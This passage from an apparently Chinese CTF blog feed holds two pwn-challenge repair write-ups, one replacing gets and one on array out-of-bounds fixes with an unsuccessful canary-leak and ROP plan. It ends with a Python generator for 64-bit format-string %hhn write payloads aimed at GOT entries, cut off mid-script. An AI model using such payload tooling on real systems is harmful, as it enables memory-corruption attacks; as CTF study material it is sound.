    <content><![CDATA[<p>#修复部分</p><p>题目出现的麻烦就是出现了gets危险函数，所以把gets危险函数去除，换成fgets或换成c++的cin即可，甚至可以加个cannary保护，因为题目本身没泄露，所以没法泄露cannary，所以溢出都不行了，cannary保护我也不记得命令，玩蛇皮，不给百度</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">begin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"===================================================================="</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"1.Encrypt"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"2.Decrypt"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"3.Exit"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Input your choice!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">48</span>];</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Input your Plaintext to be encrypted"</span>);</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">    <span class="keyword">while</span>( <span class="built_in">strlen</span>(s) &gt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)x )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span>)</span><br><span class="line">                    s[x] ^= <span class="number">0xf</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                s[x] ^= <span class="number">14</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            s[x] ^= <span class="number">13</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ++x;</span><br><span class="line">    &#125;</span><br><span class="line">    s[<span class="number">47</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Ciphertext"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> input;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EEEEEEE                            hh      iii                "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"===================================================================="</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Welcome to this Encryption machine\n"</span>);</span><br><span class="line">    begin();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            fflush(<span class="number">0</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;input);</span><br><span class="line">            getchar();</span><br><span class="line">            <span class="keyword">if</span>(input != <span class="number">2</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"I think you can do it by yourself"</span>);</span><br><span class="line">            begin();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(input == <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Bye!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( input != <span class="number">1</span>  )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        encrypt();</span><br><span class="line">        begin();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Something Wrong!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>手写了一遍代码，将gets危险函数替换掉了，其余没什么问题，这个比赛真心好，不让百度。。。。我很多函数都不会，没法查。。后面只能放弃。。</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/ce5ca923/">https://noone-hub.github.io/posts/ce5ca923/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>国赛pwn修复2</title>
    <url>/posts/5755f899/</url>
    <content><![CDATA[<h1 id="题目修复部分"><a href="#题目修复部分" class="headerlink" title="题目修复部分"></a>题目修复部分</h1><p>题目的点很容易看出，数组越界，不过如何利用这个比较难，我经过一段时间测试，发觉scanf的特性，输入-可以绕过，所以可以泄露cannary，泄露cannary过后可以任意写，然后精确覆盖到cannary过后进行ROP就行了，还有一个点就是输入长度为27的时候，他不会进行排序，这样才能ROP，不过最终我没利用成功，还有一个栈的偏移点我还没搞懂，所以最终也没打出来</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>修复建议:在读和写的时候都限制数组长度，还有排序的时候考虑长度为27的</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a1, <span class="keyword">const</span> <span class="keyword">void</span> *a2)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)(*(<span class="keyword">int</span> *)a1 - *(<span class="keyword">int</span> *)a2);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> v1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> v2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"do you would to sort your girlfriends?[Y/N/@]"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">78</span> )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"goodbye~~~"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">89</span> )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"goodbye~~~"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 != <span class="number">64</span> )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"please answer two questions!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1+1999=??\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"please answer the question1:"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;v1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1*1999=??\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please answer the question2:"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;v1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">94</span> )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you are right~\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"my girlfriend,today is very interesting!!! "</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"nice to meet you!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"here is a pole! \n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please input your name:"</span>);</span><br><span class="line"></span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"hello my destiny!\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-4Ch]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> k; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v6; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v7; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> base[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    v7 = <span class="number">999</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"how many girlfriends do you have?"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(v2 &gt; <span class="number">10</span> || v2 &lt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v2; ++i )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"please input your %dth girlfriends:"</span>, i);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;base[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v7 != <span class="number">999</span> )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"this is the sort result:"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v2; ++j )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d  "</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)base[j]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you can change your girlfriend"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">    v8 = v2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"which girlfriend do you want to change?"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(v2 &gt; <span class="number">10</span> || v2 &lt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v2; ++k )</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"now change:"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;base[k]);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">79</span> &amp;&amp; v2 &gt; <span class="number">39</span> )</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">100</span> &amp;&amp; v2 &gt; <span class="number">80</span> )</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">64</span> &amp;&amp; v2 &gt; <span class="number">55</span> )</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">100</span> )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( v2 &lt;= <span class="number">27</span> || v2 &gt; <span class="number">39</span> )</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( v2 &lt;= <span class="number">26</span> )</span><br><span class="line"></span><br><span class="line">                qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">                qsort(base,v2,<span class="number">4u</span>LL,cmp);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//sub();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//sub2();</span></span><br><span class="line"></span><br><span class="line">    sub1();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/5755f899/">https://noone-hub.github.io/posts/5755f899/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>64位格式化字符串自动篇</title>
    <url>/posts/7ec8b821/</url>
    <content><![CDATA[<h1 id="64位格式化字符串之自动化脚本编写"><a href="#64位格式化字符串之自动化脚本编写" class="headerlink" title="64位格式化字符串之自动化脚本编写"></a>64位格式化字符串之自动化脚本编写</h1><p>前言：pwntools的工具只支持32位格式化字符串，我每次做64位格式化字符串的题目都是手动调试了很久，做一道题调试得花个大半部分时间，然后再编写exp，所以我近几天在研究如何自动化的生成payload，让我能够轻松不调试一波梭，在了解原理过后，我便开始了我的编写之路。</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h2 id="fmt-payload之写入篇"><a href="#fmt-payload之写入篇" class="headerlink" title="fmt_payload之写入篇"></a>fmt_payload之写入篇</h2><p>先补充个知识：</p><ul><li>%hhn写入的是一个字节</li><li>%hn写入的是两个字节</li><li>%n写入的是四个字节<h3 id="栈偏移位置的确定"><a href="#栈偏移位置的确定" class="headerlink" title="栈偏移位置的确定"></a>栈偏移位置的确定</h3></li><li>以前都是手动调试的，然后调试多次过后发觉了规律：</li><li>他的位置就是开头6个寄存器加上你输入的payload长度/8，</li><li>因为64位程序以8个字节为一个单位，也就是说，你输入了40个字节的字符串，偏移位置就是11</li></ul><h3 id="大小的选择"><a href="#大小的选择" class="headerlink" title="大小的选择"></a>大小的选择</h3><ul><li>因为他是按已输出字符来写入的，如果你大的放前面，小的在后面就没法写入了，所以需要进行排序</li></ul><p>了解这两个过程后，我们便可以开始进行脚本的编写了</p><h3 id="脚本的编写"><a href="#脚本的编写" class="headerlink" title="脚本的编写"></a>脚本的编写</h3><h4 id="获得你需要写入的内容"><a href="#获得你需要写入的内容" class="headerlink" title="获得你需要写入的内容"></a>获得你需要写入的内容</h4><p>我是按一个字节一个字节写入的，所以我需要获得每个字节的内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAddr</span><span class="params">(write)</span>:</span></span><br><span class="line">    xor = <span class="number">0xff</span></span><br><span class="line">    addr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        result = (xor &amp; write) &gt;&gt; (i * <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> result != <span class="number">0</span>:</span><br><span class="line">            addr.append(result)</span><br><span class="line">        xor = xor * <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">return</span> addr</span><br></pre></td></tr></table></figure><p>解释下，在每个字节的对应位置 &amp; 0xff便可以获得那个位置的内容</p><h4 id="划分部分"><a href="#划分部分" class="headerlink" title="划分部分"></a>划分部分</h4><p>因为我需要将被写入的地址以及他们的内容对应起来，并进行排序，小的优先写，然后大的放后面，所以就要进行划分</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Partion</span><span class="params">(write, bewrite)</span>:</span></span><br><span class="line">    addr = getAddr(write)</span><br><span class="line">    part = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(addr)):</span><br><span class="line">        part.append( (addr[i], p64(bewrite+i)) )</span><br><span class="line">    part.sort(key=<span class="keyword">lambda</span> tup: tup[<span class="number">0</span>]) <span class="comment">#进行排序，按内容大小来排</span></span><br><span class="line">    <span class="keyword">return</span> part</span><br></pre></td></tr></table></figure><h4 id="获取排序后的数组"><a href="#获取排序后的数组" class="headerlink" title="获取排序后的数组"></a>获取排序后的数组</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sizeUp</span><span class="params">(part)</span>:</span></span><br><span class="line">    size = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(part)):</span><br><span class="line">        size.append(part[i][<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> size</span><br></pre></td></tr></table></figure><h4 id="将地址进行打包"><a href="#将地址进行打包" class="headerlink" title="将地址进行打包"></a>将地址进行打包</h4><p>因为我是将地址放在后面的，防止00截断，然后在将排序后的地址按顺序打包起来</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">packAddr</span><span class="params">(part)</span>:</span></span><br><span class="line">    addr =<span class="string">''</span>.join(x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> part)</span><br><span class="line">    address = <span class="string">''</span>.join(addr)</span><br><span class="line">    <span class="keyword">return</span> address</span><br></pre></td></tr></table></figure><h4 id="处理偏移"><a href="#处理偏移" class="headerlink" title="处理偏移"></a>处理偏移</h4><p>自动进行计算偏移，原因我已经说过了，通过计算是可以得出偏移位置的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offsetDeal</span><span class="params">(size)</span>:</span></span><br><span class="line">    length = <span class="number">12</span> * len(size)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        offset = length / <span class="number">8</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        offset = length / <span class="number">8</span></span><br><span class="line">    length = offset * <span class="number">8</span> </span><br><span class="line">    offset += <span class="number">6</span></span><br><span class="line">    <span class="keyword">return</span> offset, length</span><br></pre></td></tr></table></figure><h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h4><p>只是将对应位置和对应偏移的payload搞定</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payloadGenerate</span><span class="params">(size, offset)</span>:</span></span><br><span class="line">    payload = <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[<span class="number">0</span>], offset)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(size)):</span><br><span class="line">        payload += <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[i]-size[i<span class="number">-1</span>],offset+i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><h4 id="主要函数，生成完整payload"><a href="#主要函数，生成完整payload" class="headerlink" title="主要函数，生成完整payload"></a>主要函数，生成完整payload</h4><ol><li>首先获得划分并排序后的数组，就是地址和写入内容对应的数组</li><li>获得对应的大小，方便后面格式化</li><li>获得打包后的地址，方便后面添加</li><li>然后处理偏移和地址的对齐，64位按8个字节这样对齐</li><li>生成payload并进行对齐</li><li>offset可选，防止意外，自行找offset</li><li>返回payload</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_payload</span><span class="params">(bewrite,  write, offset=<span class="number">0</span> )</span>:</span></span><br><span class="line">    part = Partion(write, bewrite)</span><br><span class="line">    size = sizeUp(part)</span><br><span class="line">    address = packAddr(part)</span><br><span class="line"></span><br><span class="line">    result = offsetDeal(size)</span><br><span class="line">    <span class="keyword">if</span> offset == <span class="number">0</span>:</span><br><span class="line">        offset = result[<span class="number">0</span>]</span><br><span class="line">    length = result[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    payload = payloadGenerate(size, offset)</span><br><span class="line">    payload = payload.ljust(length, <span class="string">'a'</span>)</span><br><span class="line">    payload += address</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>example:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = fmt_payload(exit_got,<span class="number">0x0000000000400626</span>)</span><br><span class="line">payload = fmt_payload(exit_got,<span class="number">0x0000000000400626</span>，<span class="number">10</span>)</span><br></pre></td></tr></table></figure><h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得写入的每一位的内容</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAddr</span><span class="params">(write)</span>:</span></span><br><span class="line">    xor = <span class="number">0xff</span></span><br><span class="line">    addr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        result = (xor &amp; write) &gt;&gt; (i * <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> result != <span class="number">0</span>:</span><br><span class="line">            addr.append(result)</span><br><span class="line">        xor = xor * <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 划分部分，按大小排序</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Partion</span><span class="params">(write, bewrite)</span>:</span></span><br><span class="line">    addr = getAddr(write)</span><br><span class="line">    part = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(addr)):</span><br><span class="line">        part.append( (addr[i], p64(bewrite+i)) )</span><br><span class="line">    part.sort(key=<span class="keyword">lambda</span> tup: tup[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> part</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得排序后的大小，升序</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sizeUp</span><span class="params">(part)</span>:</span></span><br><span class="line">    size = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(part)):</span><br><span class="line">        size.append(part[i][<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> size</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打包地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">packAddr</span><span class="params">(part)</span>:</span></span><br><span class="line">    addr =<span class="string">''</span>.join(x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> part)</span><br><span class="line">    address = <span class="string">''</span>.join(addr)</span><br><span class="line">    <span class="keyword">return</span> address</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动计算偏移</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> 